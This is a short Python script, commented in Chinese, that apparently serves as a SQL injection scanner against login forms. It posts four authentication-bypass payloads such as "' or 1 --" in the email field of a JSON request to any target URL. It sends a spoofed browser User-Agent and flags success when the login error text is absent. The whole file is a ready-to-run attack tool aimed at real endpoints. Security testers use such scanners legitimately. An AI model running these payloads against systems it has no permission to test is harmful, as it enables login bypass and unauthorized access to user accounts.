import requests
import argparse

# 定义payload列表
payloads = [
    "' or 1 --",
    '" OR "" = "',
    '" OR 1 = 1 -- -',
    "' OR '' = '"
]

# 解析命令行参数
parser = argparse.ArgumentParser(description='检测SQL注入漏洞')
parser.add_argument('-u', '--url', required=True, help='目标URL')
args = parser.parse_args()


def check_vulnerability(url):
    for payload in payloads:
        # 构造请求数据
        data = {
            "email": payload,
            "password": "123456"
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36"
        }

        # 发送POST请求
        response = requests.post(url, json=data, headers=headers)

        # 检查响应内容
        if "Invalid email or password" not in response.text:
            print(f"发现漏洞！Payload: {payload}")
            return True
    print("未发现漏洞")
    return False


if __name__ == "__main__":
    url = args.url
    check_vulnerability(url)
